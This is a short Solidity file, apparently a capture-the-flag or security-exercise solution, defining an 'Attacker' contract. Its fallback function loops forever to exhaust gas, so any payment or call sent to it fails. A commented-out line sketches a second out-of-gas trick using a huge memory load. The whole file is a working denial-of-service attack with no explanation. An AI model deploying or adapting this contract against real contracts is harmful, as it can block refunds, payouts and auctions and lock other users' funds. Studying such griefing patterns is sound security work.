// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

contract Attacker {
    fallback() external payable {
        while (true) {}

        // TODO: do the shortest out-of-gas trick here, it was something like this?
        // assembly {
        //     pop(mload(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff))
        // }
    }
}
